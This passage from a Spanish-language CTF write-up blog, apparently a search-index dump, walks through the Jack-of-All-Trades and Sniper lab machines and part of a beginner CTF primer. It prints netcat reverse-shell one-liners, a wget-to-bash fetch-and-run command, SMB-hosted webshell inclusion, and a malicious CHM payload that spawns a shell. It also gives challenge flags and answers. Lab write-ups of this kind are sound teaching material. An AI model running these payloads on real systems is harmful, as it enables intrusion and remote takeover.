Traverxec","uri":"https://sckull.github.io/posts/traverxec/"},{"content":"Jack-of-All-Trades es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Jack-of-All-Trades     Info Boot-to-root originally designed for Securi-Tay 2020   Puntos 400   Dificultad Media   Maker MuirlandOracle    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # Nmap 7.80 scan initiated Wed Apr 8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.10.111.123 Nmap scan report for 10.10.111.123 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Jack-of-all-trades! |_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 80/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA) | 2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA) | 256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA) |_ 256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 8 17:57:19 2020 -- 1 IP address (1 host up) scanned in 76.06 seconds     HTTP Al visitar el puerto 80 nos muestra un error nuestro navegador.\nLa IP esta activa, solo el puerto en el que esta corriendo Apache es el 22 y no el 80, se puede configurar el puerto en firefox dentro de about:config creando un string de configuracion.\nAhora si podemos visitar la pagina y nos muestra lo siguiente.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@upset:~/thm/jack-of-All-Trades# gobuster dir -u http://10.10.111.123:22/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /.htpasswd (Status: 403) /.htpasswd.html (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.php (Status: 403) /.hta (Status: 403) /.hta.txt (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /assets (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /recovery.php (Status: 200) /server-status (Status: 403) root@upset:~/thm/jack-of-All-Trades#   En el index de la pagina encontramos varias cosas interesantes en el codigo fuente.\nVemos un comentario que al decodificarlo en base64 nos muestra un mensaje.\nNos dirigimos a /recovery.php e intentamos utilizar la contraseña con Johny Grave y combinacion del nombre pero no nos deja ingresar.\nVemos en el codigo fuente una string codificada.\nGQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= Utilizamos base32 y hex para decodificar la cadena, lo cual nos devuelve una nueva cadena cifrada, esta vez al parecer es Caesar Cipher.\ndcode.fr tiene una herramienta muy util que nos ayudó a decifrar el mensaje, CAesar Cipher.\nEl link que nos menciona el mensaje nos redirige a una pagina de wikipedia con el nombre de Stegosauria, si recordamos en el index hay una imagen con un nombre parecido. Intentamos con steganografia en la imagen utilizando steghide.\nObtenemos un archivo que nos indica que vamos por buen camino pero la imagen no es la correcta. Hacemos lo mismo con las otras dos imagenes del index, y obtuvimos un archivo con credenciales en la imagen header.jpg.\nIngresamos al panel de /recovery.php y vemos un mensaje.\nLe pasamos un comando al parametro cmd y logramos ejecutar el comando.\nAhora que podemos ejecutar comandos, utilizamos esta ventaja para obtener una shell inversa, primero creamos un archivo el que contenga nuestro comando para nuestra shell.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f Creamos un pequeño servidor http con python3 python3 -m http.server 80. Ejecutamos el siguiente comando para obtener nuestra shell.\nbash -c \u0026quot;$(wget -qO- 10.8.1.72/shell.sh)\u0026quot; Y ponemos a la escucha netcat en nuestra maquina rlwrap nc -lvp 1338 y obtenemos nuestra shell.\nUSER - JACK Dentro del directorio /home encontramos una lista de posibles contraseñas que parecen ser del usuario jack.\nUtilizamos hydra con la lista de posibles contraseñas en el servicio SSH utilizando el puerto 80, logramos encontrar la contraseña.\nUtilizamos ssh y obtenemos una shell.\nVemos una imagen, la pasamos a nuestra maquina con netcat, abrimos la imagen y vemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos los binarios que puedan ayudar a obtener una shell con privilegios root, encontramos strings con el cual podemos leer archivos.\nUtilizamos strings para obtener nuestra flag /root/root.txt.\n","description":"","id":37,"section":"posts","tags":["linux"],"title":"TryHackMe - Jack-of-All-Trades","uri":"https://sckull.github.io/posts/jackofalltrades/"},{"content":"Sniper es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Sniper     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.151   Maker MinatoTW \u0026amp; felamos     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-15 18:34:38 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.151 Discovered open port 135/tcp on 10.10.10.151 Discovered open port 49667/tcp on 10.10.10.151 Discovered open port 139/tcp on 10.10.10.151 # Nmap 7.80 scan initiated Wed Jan 15 12:30:50 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.151 Nmap scan report for 10.10.10.151 Host is up (0.24s latency). Not shown: 65530 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 8h01m11s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-16T02:36:27 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 15 12:35:53 2020 -- 1 IP address (1 host up) scanned in 303.66 seconds   HTTP En el puerto 80 corriendo IIS con una pagina web.\nGOBUSTER Escaneo de directorios y archivos con gobuster.\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /Blog (Status: 301) /blog (Status: 301) /css (Status: 301) /images (Status: 301) /Images (Status: 301) /index.php (Status: 200) /Index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /user (Status: 301)   /blog/ 1 2 3 4 5 6 7 8  root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/blog/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /css (Status: 301) /error.html (Status: 200) /header.html (Status: 200) /Index.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301   /user/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/user/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /auth.php (Status: 302) /css (Status: 301) /db.php (Status: 200) /DB.php (Status: 200) /fonts (Status: 301) /Images (Status: 301) /images (Status: 301) /index.php (Status: 302) /Index.php (Status: 302) /index.php (Status: 302) /js (Status: 301) /login.php (Status: 200) /Login.php (Status: 200) /logout.php (Status: 302) /registration.php (Status: 200) /vendor (Status: 301)   Encontramos dos rutas distintas donde estan almacenadas dos paginas diferentes, una donde se muestra un panel de inicio de sesion y la otra nos muestra una pagina con algunos articulos.\n/user/ /blog/ LFI-RFI -\u0026gt; Shell IUSR En la pagina de /blog/ encontramos que, al cambiar de idioma se le pasa como parametro un archivo existente a lang, a la pagina.\nAl realizar una consulta/archivo que no exista en la maquina nos muestra un mensaje de error, esto quiere decir que debe de existir el archivo en la maquina.\nIntentamos todos los payloads que pudiesen afectar a esta vulnerabilidad pero ninguno funciono, por lo que para explotar esta vulnerabilidad utilizamos un servidor SAMBA para pasarle como parametro una webshell desde nuestra maquina.\nConfiguracion de Servidor SAMBA:\n1 2 3 4 5  apt-get install samba mkdir /var/www/html/pub/ chmod 0555 /var/www/html/pub/ chown -R nobody:nogroup /var/www/html/pub/ touch \u0026gt; /etc/samba/smb.conf   /etc/samba/smb.conf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  [global] workgroup = WORKGROUP server string = Samba Server %v netbios name = indishell-lab security = user map to guest = bad user name resolve order = bcast host dns proxy = no bind interfaces only = yes [test] path = /var/www/html/pub writable = yes guest ok = yes guest only = yes read only = yes directory mode = 0555 force user = nobody   service smbd restart Acceder a:\n\\\\10.10.10.10\\test\\ La webshell que utilizamos es WhiteWinterWolf - Webshell. Una vez terminado nuestra configuracion le pasamos a la pagina nuestra IP junto con el SHARENAME y la webshell, y logramos ejecuar comandos con el usuario IUSR.\nAhora que podemos ejecutar comandos vamos a obtener una shell inversa utilizando netcat (nc.exe) en la misma carpeta donde colocamos nuestra webshell. Utilizamos el siguiente comando:\n1  \\\\10.10.15.244\\test\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.244 443   Obtenemos una shell con el usuario IUSR.\nUSER - Chris Enumeramos los archivos que se encuentran en ambas paginas (blog, user) y encontramos en user un archivo de php en el que se encuentran las credenciales para la base de datos.\nCredenciales:\n1 2  Host, User, Password, DB \u0026#34;localhost\u0026#34;,\u0026#34;dbuser\u0026#34;,\u0026#34;36mEAhz/B8xQ~2VM\u0026#34;,\u0026#34;sniper\u0026#34;   Dentro de las carpetas de Usuarios (C:\\Users) encontramos a Chris como uno de los usuarios, utilizamos la contraseña de la base de datos con el usuario Chris para verificar que tenga permisos de escritura en la maquina atraves de samba con smbmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.151... [+] IP: 10.10.10.151:445\tName: 10.10.10.151 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin C$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-368-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1e4-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-408-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-598-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-a2c-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\ttrkwks fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-270-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-284-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tROUTER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132236907993416575.1908.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiisipmbed63cd4-5a7a-4011-8a3f-7ca5d2834ac3 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiislogpipe3e6fd272-542c-4985-87e5-bd930a7401e4 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237251159401733.1252.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237268742138566.1496.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tIISFCGI-3e6bfe08-4ed8-4e32-97ff-7c49438ccb63 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tIISFCGI-0587ff21-c423-47bb-872e-34f067d827a9 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237302290243128.4168.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237304828945308.4400.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237305109360308.5580.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC   Vemos que Chris tiene permisos de escritura y lectura en (.) la maquina. Intentamos utilizar smbclient y los modulos de metasploit para samba pero ninguno de ellos sirvio para obtener una shell. Por lo que utilizamos la misma tecnica que utilizamos con la maquina Arkham de HackTheBox en la que utilizamos las credenciales para obtener una sesion nueva utilizando powershell.\n1 2 3 4  $username =\u0026#34;Sniper\\Chris\u0026#34;; $password = convertto-securestring -AsPlainText -Force -String \u0026#34;36mEAhz/B8xQ~2VM\u0026#34;; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; New-PSSession -Credential $cred | Enter-PSSession   Al ejecutar estos comandos nos muestra una shell en localhost con el usuario Chris, pero, no podemos saltar hacia otras carpetas.\nPara obtener una shell con el usuario Chris utilizamos el mismo comando que utilizamos para obtener una shell con IUSR.\n1  \\\\10.10.15.244\\test\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.244 448   Obtenemos una shell y nuestra flag user.txt.\nPrivilege Escalation (CTF Like) - Malicious CHM file Enumeramos los directorios de Chris, vemos un archivo chm el cual se encuentra en C:\\Users\\Chris\\Downloads llamado instructions.chm.\nAl abrirlo en Windows nos muestra un mensaje.\nPff... This dumb CEO always makes me do all the shitty work. SMH! I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him. De igual forma encontramos una nota en C:\\Docs y un PDF.\nphp for dummies-trial.pdf:\n1 2 3 4 5 6  note.txt: Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you\u0026#39;ve prepared the documentation for our new app. Drop it here when you\u0026#39;re done with it. Regards, Sniper CEO.   Vemos claramente en la nota que, Chris debe de reparar los bugs que existen en la pagina, luego de eso realizar la documentacion (instructions.chm al parecer) y dejarlos en la misma carpeta que la nota.\nCopiamos el archivo instructions.chm en C:\\Docs y despues de un tiempo el archivo desaparece, por lo que asumimos que es eliminado o revisado por el CEO (\u0026ldquo;Administrador\u0026rdquo;).\nCreamos un archivo CHM el cual contenga un comando para obtener una shell inversa, utilizamos \u0026ldquo;Microsoft HTML Help Workshop and Documentation\u0026rdquo; para generarlo.\nAgregamos al archivo principal nuestro siguiente payload entre la etiqueta BODY:\n1 2 3 4 5 6 7 8 9  \u0026lt;OBJECT id=x classid=\u0026#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\u0026#34; width=1 height=1\u0026gt; \u0026lt;PARAM name=\u0026#34;Command\u0026#34; value=\u0026#34;ShortCut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Button\u0026#34; value=\u0026#34;Bitmap::shortcut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c C:\\Users\\Chris\\Documents\\nc.exe 10.10.15.244 449 -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item2\u0026#34; value=\u0026#34;273,1,1\u0026#34;\u0026gt; \u0026lt;/OBJECT\u0026gt; \u0026lt;SCRIPT\u0026gt; x.Click(); \u0026lt;/SCRIPT\u0026gt;   Trasladamos nuestro archivo a la carpeta C:\\Docs, netcat (nc.exe) y esperamos a que nuestro payload sea ejecutado:\nObtenemos nuestra shell con permisos de administrador y nuestra flag root.txt.\n","description":"","id":38,"section":"posts","tags":["windows"],"title":"Hack The Box - Sniper","uri":"https://sckull.github.io/posts/sniper/"},{"content":"Stealthcopter CTF Primer es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.\n Informacion de la Maquina    Titulo Stealthcopter ctf primer1     Info CTF primer containing 40 challenges (web, network, crypto and forensics) for beginnners   Puntos 8481   Dificultad Facil   Maker stealthcopter    WEB w.01 Revisa el codigo fuente de la pagina.\nw.02 Repara el nombre del script en la cabecera del archivo HTML y revisa la consola (developmer tools).\nw.03 Imagen base64 codificada.\nw.04 Elimina los // en el codigo fuente.\nw.05 Key bruteforce o adivina ;).\n1 2 3 4 5  sckull@uplifted:~/tmp/web$ php w.05.php \u0026#39;key=7\u0026#39; Key entered: 7 CipherText: T3FiSXVlOFYvVTJCRHRnRFdTRUZOeHplNVZpK0pQZUVUbWNmTHNCZUt5RT0= PlainText: FLAG{n0t_s0_t0ugh} sckull@uplifted:~/tmp/web$   w.06 Reto\n1  var _0x550c=[\u0026#39;HsOde8OyacKIw518XMKNPsO8SMO7w4JxwoPCugDCiwh4w43Cqw==\u0026#39;,\u0026#39;CcK3wq4=\u0026#39;];(function(_0x1421f9,_0xa7900b){var _0x371c54=function(_0x5f2f93){while(--_0x5f2f93){_0x1421f9[\u0026#39;push\u0026#39;](_0x1421f9[\u0026#39;shift\u0026#39;]());}};_0x371c54(++_0xa7900b);}(_0x550c,0x1e6));var _0x56ae=function(_0xec1512,_0x3f22ed){_0xec1512=_0xec1512-0x0;var _0x353971=_0x550c[_0xec1512];if(_0x56ae[\u0026#39;wlUhtf\u0026#39;]===undefined){(function(){var _0x353626=function(){var _0x1efe97;try{_0x1efe97=Function(\u0026#39;return\\x20(function()\\x20\u0026#39;+\u0026#39;{}.constructor(\\x22return\\x20this\\x22)(\\x20)\u0026#39;+\u0026#39;);\u0026#39;)();}catch(_0x299503){_0x1efe97=window;}return _0x1efe97;};var _0x53087e=_0x353626();var _0x4b80a9=\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#39;;_0x53087e[\u0026#39;atob\u0026#39;]||(_0x53087e[\u0026#39;atob\u0026#39;]=function(_0x8b960b){var _0x584879=String(_0x8b960b)[\u0026#39;replace\u0026#39;](/=+$/,\u0026#39;\u0026#39;);for(var _0x38ec89=0x0,_0xcfc329,_0xd90795,_0x409b70=0x0,_0x429a24=\u0026#39;\u0026#39;;_0xd90795=_0x584879[\u0026#39;charAt\u0026#39;](_0x409b70++);~_0xd90795\u0026amp;\u0026amp;(_0xcfc329=_0x38ec89%0x4?_0xcfc329*0x40+_0xd90795:_0xd90795,_0x38ec89++%0x4)?_0x429a24+=String[\u0026#39;fromCharCode\u0026#39;](0xff\u0026amp;_0xcfc329\u0026gt;\u0026gt;(-0x2*_0x38ec89\u0026amp;0x6)):0x0){_0xd90795=_0x4b80a9[\u0026#39;indexOf\u0026#39;](_0xd90795);}return _0x429a24;});}());var _0x4f002d=function(_0x5c44fa,_0x3f22ed){var _0x2dee1d=[],_0x17ee0=0x0,_0x4a4ac3,_0x41b3d2=\u0026#39;\u0026#39;,_0x329c74=\u0026#39;\u0026#39;;_0x5c44fa=atob(_0x5c44fa);for(var _0x2ee72b=0x0,_0x1f3f1d=_0x5c44fa[\u0026#39;length\u0026#39;];_0x2ee72b\u0026lt;_0x1f3f1d;_0x2ee72b++){_0x329c74+=\u0026#39;%\u0026#39;+(\u0026#39;00\u0026#39;+_0x5c44fa[\u0026#39;charCodeAt\u0026#39;](_0x2ee72b)[\u0026#39;toString\u0026#39;](0x10))[\u0026#39;slice\u0026#39;](-0x2);}_0x5c44fa=decodeURIComponent(_0x329c74);for(var _0xbc2d51=0x0;_0xbc2d51\u0026lt;0x100;_0xbc2d51++){_0x2dee1d[_0xbc2d51]=_0xbc2d51;}for(_0xbc2d51=0x0;_0xbc2d51\u0026lt;0x100;_0xbc2d51++){_0x17ee0=(_0x17ee0+_0x2dee1d[_0xbc2d51]+_0x3f22ed[\u0026#39;charCodeAt\u0026#39;](_0xbc2d51%_0x3f22ed[\u0026#39;length\u0026#39;]))%0x100;_0x4a4ac3=_0x2dee1d[_0xbc2d51];_0x2dee1d[_0xbc2d51]=_0x2dee1d[_0x17ee0];_0x2dee1d[_0x17ee0]=_0x4a4ac3;}_0xbc2d51=0x0;_0x17ee0=0x0;for(var _0x4301cb=0x0;_0x4301cb\u0026lt;_0x5c44fa[\u0026#39;length\u0026#39;];_0x4301cb++){_0xbc2d51=(_0xbc2d51+0x1)%0x100;_0x17ee0=(_0x17ee0+_0x2dee1d[_0xbc2d51])%0x100;_0x4a4ac3=_0x2dee1d[_0xbc2d51];_0x2dee1d[_0xbc2d51]=_0x2dee1d[_0x17ee0];_0x2dee1d[_0x17ee0]=_0x4a4ac3;_0x41b3d2+=String[\u0026#39;fromCharCode\u0026#39;](_0x5c44fa[\u0026#39;charCodeAt\u0026#39;](_0x4301cb)^_0x2dee1d[(_0x2dee1d[_0xbc2d51]+_0x2dee1d[_0x17ee0])%0x100]);}return _0x41b3d2;};_0x56ae[\u0026#39;ZUnPBK\u0026#39;]=_0x4f002d;_0x56ae[\u0026#39;ffVsLy\u0026#39;]={};_0x56ae[\u0026#39;wlUhtf\u0026#39;]=!![];}var _0x5e7cc1=_0x56ae[\u0026#39;ffVsLy\u0026#39;][_0xec1512];if(_0x5e7cc1===undefined){if(_0x56ae[\u0026#39;RhVTbi\u0026#39;]===undefined){_0x56ae[\u0026#39;RhVTbi\u0026#39;]=!![];}_0x353971=_0x56ae[\u0026#39;ZUnPBK\u0026#39;](_0x353971,_0x3f22ed);_0x56ae[\u0026#39;ffVsLy\u0026#39;][_0xec1512]=_0x353971;}else{_0x353971=_0x5e7cc1;}return _0x353971;};function callme(){var _0x4b81bb=_0x56ae(\u0026#39;0x0\u0026#39;,\u0026#39;E^eq\u0026#39;);console[_0x56ae(\u0026#39;0x1\u0026#39;,\u0026#39;X!jV\u0026#39;)](_0x4b81bb);}   Ejecuta la funcion callme().\nw.07 Key bruteforce o adivina ;).\nsckull@uplifted:~/tmp/web$ php w.07.php 'key=1337' Key entered: 1337 CipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0= PlainText: sckull@uplifted:~/tmp/web$ php w.07.php 'key=1338' Key entered: 1338 CipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0= PlainText: FLAG{4_l1ttl3_b4t_h4rd3r} sckull@uplifted:~/tmp/web$ w.08 Reto\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiRkxBR3tqd3RfdDBrM25zX2FyM19jMDBsX2IzNG56fSJ9.gNVX4fCIMvjLYZ0jUY0untMYbPmRNNFzZwXyU01bv-M Json Web Token\nw.09 Reto\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0#756c17ca05dbc57b9ded6541055370059c145e3b31521c0c98df2b1674725601 Utilizamos hashcat\nsckull@uplifted:~/tmp/web$ /home/sckull/tools/hashcat/hashcat64.bin -m 16500 09web_jwt.txt /home/sckull/tools/rockyou.txt -o 09web_output.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026quot;CL_OUT_OF_RESOURCES\u0026quot; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: /home/sckull/tools/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 Session..........: hashcat Status...........: Cracked Hash.Type........: JWT (JSON Web Token) Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNy...nRyVgE Time.Started.....: Mon Mar 16 02:21:40 2020 (0 secs) Time.Estimated...: Mon Mar 16 02:21:40 2020 (0 secs) Guess.Base.......: File (/home/sckull/tools/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6400.2 kH/s (8.23ms) @ Accel:512 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 98304/14344385 (0.69%) Rejected.........: 0/98304 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456 -\u0026gt; Donovan Hardware.Mon.#1..: Temp: 60c Util: 47% Core:1189MHz Mem:2505MHz Bus:4 Started: Mon Mar 16 02:21:29 2020 Stopped: Mon Mar 16 02:21:42 2020 sckull@uplifted:~/tmp/web$ cat 09web_output.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0.dWwXygXbxXud7WVBBVNwBZwUXjsxUhwMmN8rFnRyVgE:rockyou sckull@uplifted:~/tmp/web$ w.10 La clave esta en el codigo fuente $key = hash( 'sha256', str(0x22C49FE9));\nsckull@uplifted:~/tmp/web$ python Python 2.7.17 (default, Nov 7 2019, 10:07:09) [GCC 7.4.0] on linux2 Type \u0026quot;help\u0026quot;, \u0026quot;copyright\u0026quot;, \u0026quot;credits\u0026quot; or \u0026quot;license\u0026quot; for more information. \u0026gt;\u0026gt;\u0026gt; print 0x22C49FE9 583311337 \u0026gt;\u0026gt;\u0026gt; sckull@uplifted:~/tmp/web$ php w.10.php 'key=583311337' Key entered: 583311337 CipherText: OWVzUHhVVFNsM0t6NFhDb1FiT0RJaHNrWWYrM3VRMi9FNXcyTGhxbVV0aHpKUjdOcGRVcWtZcWc3djV5OFVxQw== PlainText: FLAG{1_h0p3_y0u_d1dnt_brut3f0rc3_m3...LINE_16} sckull@uplifted:~/tmp/web$ Cryptography c.01 Reto:\nRkxBR3sxc3RfdGltZV9sdWNreX0= Base64\n1 2 3 4 5  sckull@uplifted:~/tmp/crypto$ cat c.01 RkxBR3sxc3RfdGltZV9sdWNreX0= sckull@uplifted:~/tmp/crypto$ cat c.01|base64 -d FLAG{1st_time_lucky} sckull@uplifted:~/tmp/crypto$   c.02 